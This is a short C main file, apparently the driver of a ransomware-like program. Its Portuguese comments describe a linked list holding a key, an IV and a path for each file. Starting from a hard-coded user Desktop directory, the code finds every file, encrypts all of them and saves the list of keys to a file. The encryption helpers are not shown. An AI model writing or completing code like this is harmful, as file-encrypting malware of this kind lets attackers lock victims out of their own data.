#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"lib/func.h"
#include"lib/struct.h"


/*
 * char * strings[3] -> strings[0] = key, strings[1] = iv , strings[2] = path
 * dessa forma não precisa criar uma nova estrutura
 * 
 * writing:
 * fwrite(List, sizeof(List), 1, file);
 * 
 * typedef struct no{
 *      char *strings[3];
 *      struct no *prox;
 * }List;
 * 
 * reading :
 * fread(&List, sizeof(List), 1, file);
 */

int main(){
    List *files = NULL;
    List *encrypted = NULL;
    List *not_encrypted = NULL;
    //char* start_path = get_start_path();
    char *start_path = "/home/tarcisio/Desktop/";

    find_files(&files, start_path);
    encrypt_files(files, &encrypted, &not_encrypted);
    save_into_file_encrypted_list(encrypted, start_path);
    //read_from_file_encrypted_files(&encrypted, start_path);
    //destroy(&files);
    //destroy_encrypted_list(&encrypted);

    return 0;
}
